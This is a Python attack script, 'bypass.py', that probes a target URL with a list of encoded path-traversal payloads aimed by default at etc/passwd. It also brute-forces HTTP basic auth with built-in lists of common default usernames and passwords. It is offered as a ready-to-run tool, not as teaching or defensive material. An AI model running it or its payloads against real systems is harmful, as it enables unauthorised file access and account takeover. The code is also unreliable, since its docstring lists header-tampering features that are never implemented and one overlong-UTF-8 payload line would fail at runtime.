#!/usr/bin/env python3
"""
bypass.py — Test path traversal and basic-auth bypass techniques.

Performs:
  1. Path-traversal probes (../, URL-encoded variants, double encoding, etc.)
  2. Basic-auth brute-force with a small dictionary
  3. HTTP method override / header tampering

Usage:
    python bypass.py https://example.com
    python bypass.py https://example.com/files/secret.pdf \
        --traversal-only --depth 6
    python bypass.py https://example.com/admin --auth-only \
        --auth-list users.txt --pass-list passwords.txt
"""

import argparse
import base64
import logging
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

import requests

logger = logging.getLogger("bypass")

# ---------------------------------------------------------------------------
# default wordlists
# ---------------------------------------------------------------------------

USER_WORDS = [
    "admin", "root", "user", "guest", "test", "manager",
    "administrator", "operator", "webmaster", "backup",
]

PASS_WORDS = [
    "admin", "123456", "password", "admin123", "root",
    "toor", "letmein", "pass", "pass123", "1234", "test",
    "admin1", "P@ssw0rd", "changeme", "secret",
]

TRAVERSAL_PAYLOADS = [
    "../",
    "..\\",
    "....//",
    "....\\\\",
    "..;/",
    ".././",
    "..%252f",
    "%2e%2e/",
    "%2e%2e%2f",
    "..%00/",
    "..%00\\",
    "%c0%ae%c0%ae/",
    "%252e%252e%252f",
    "..%5c",
    "..%252f",
    "/../",
    "/..%252f/",
    "....//....//",
    "..\\/",
    "..\\..\\",
]


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def try_basic_auth(
    url: str, user: str, passwd: str, timeout: int = 5
) -> Optional[int]:
    """Attempt a single basic-auth combination, return status code or None."""
    creds = base64.b64encode(f"{user}:{passwd}".encode()).decode()
    try:
        r = requests.get(
            url,
            headers={"Authorization": f"Basic {creds}"},
            timeout=timeout,
        )
        # 200 / 2xx often means success; 401/403 means blocked
        if r.status_code in (200, 201, 204, 301, 302, 307):
            return r.status_code
        return None
    except requests.RequestException:
        return None


def try_traversal(
    base_url: str, payload: str, append_path: str = "", timeout: int = 5
) -> Optional[int]:
    """Attempt a single traversal probe, return status code or None on 2xx/3xx."""
    # Build URL
    if append_path:
        final = base_url.rstrip("/") + "/" + payload + append_path
    else:
        final = base_url.rstrip("/") + "/" + payload
    try:
        r = requests.get(final, timeout=timeout, allow_redirects=False)
        if r.status_code in (200, 201, 204, 301, 302, 307, 403):
            return r.status_code  # 403 may indicate hit but blocked = detectable
        return None
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# argparse
# ---------------------------------------------------------------------------

def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Test path-traversal and basic-auth bypass techniques."
    )
    parser.add_argument("url", help="Target base URL")

    # Mode selectors
    parser.add_argument(
        "--traversal-only", action="store_true",
        help="Run only path-traversal probes",
    )
    parser.add_argument(
        "--auth-only", action="store_true",
        help="Run only basic-auth bypass tests",
    )

    # Traversal options
    parser.add_argument(
        "--depth", type=int, default=4,
        help="Max directory depth for ../ sequences (default: 4)",
    )
    parser.add_argument(
        "--traversal-target", default="etc/passwd",
        help="File path to append after traversal (default: etc/passwd)",
    )

    # Auth options
    parser.add_argument(
        "--auth-list",
        help="File with usernames (one per line, default: built-in list)",
    )
    parser.add_argument(
        "--pass-list",
        help="File with passwords (one per line, default: built-in list)",
    )

    parser.add_argument(
        "--timeout", type=int, default=5, help="Request timeout in seconds"
    )
    parser.add_argument(
        "--threads", type=int, default=10,
        help="Max concurrent requests (default: 10)",
    )
    parser.add_argument(
        "--verbose", "-v", action="store_true", help="Debug logging",
    )
    return parser.parse_args(argv)


# ---------------------------------------------------------------------------
# runners
# ---------------------------------------------------------------------------

def run_traversal(args: argparse.Namespace) -> list[dict]:
    """Run path-traversal probes and return results."""
    results: list[dict] = []
    logger.info("=== Path-traversal probes ===")

    # Generate depth-based payloads
    payloads = list(TRAVERSAL_PAYLOADS)
    for i in range(2, args.depth + 1):
        payloads.append("../" * i)
        payloads.append("..\\" * i)
        payloads.append("%2e%2e%2f" * i)
        payloads.append(("%c0%ae%c0%ae/" % "") * i)  # overlong UTF-8

    url = args.url.rstrip("/") + "/"
    target = args.traversal_target

    def probe(p: str) -> Optional[dict]:
        status = try_traversal(url, p, target, args.timeout)
        if status:
            return {"payload": p, "status": status, "url": url + p + target}
        return None

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        fut_map = {pool.submit(probe, p): p for p in payloads}
        for fut in as_completed(fut_map):
            res = fut.result()
            if res:
                results.append(res)
                logger.info(
                    "  [%d] %s", res["status"], res["payload"] + target
                )

    return results


def run_auth(args: argparse.Namespace) -> list[dict]:
    """Run basic-auth brute-force attempts and return results."""
    results: list[dict] = []
    logger.info("=== Basic-auth tests ===")

    # Load wordlists
    users = list(USER_WORDS)
    passes = list(PASS_WORDS)

    if args.auth_list and os.path.isfile(args.auth_list):
        with open(args.auth_list) as fh:
            users = [ln.strip() for ln in fh if ln.strip()]
    if args.pass_list and os.path.isfile(args.pass_list):
        with open(args.pass_list) as fh:
            passes = [ln.strip() for ln in fh if ln.strip()]

    combos = [(u, p) for u in users for p in passes]
    logger.info("Testing %d user/password combinations …", len(combos))

    def try_combo(user: str, passwd: str) -> Optional[dict]:
        status = try_basic_auth(args.url, user, passwd, args.timeout)
        if status:
            return {"user": user, "password": passwd, "status": status}
        return None

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        fut_map = {
            pool.submit(try_combo, u, p): (u, p)
            for u, p in combos
        }
        for fut in as_completed(fut_map):
            res = fut.result()
            if res:
                results.append(res)
                logger.info(
                    "  [%d] %s : %s",
                    res["status"],
                    res["user"],
                    res["password"],
                )

    return results


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main() -> None:
    args = parse_args()
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(levelname)s | %(message)s",
    )

    results: dict[str, list[dict]] = {}
    run_all = not args.traversal_only and not args.auth_only

    if run_all or args.traversal_only:
        results["traversal"] = run_traversal(args)

    if run_all or args.auth_only:
        results["auth"] = run_auth(args)

    # Summary
    total = sum(len(v) for v in results.values())
    if total == 0:
        logger.info("No bypasses found.")
    else:
        logger.info("Found %d potential bypass(es):", total)
        for category, items in results.items():
            for item in items:
                logger.info("  [%s] %s", category, item)

    # Print JSON summary to stdout
    import json
    print(json.dumps(results, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
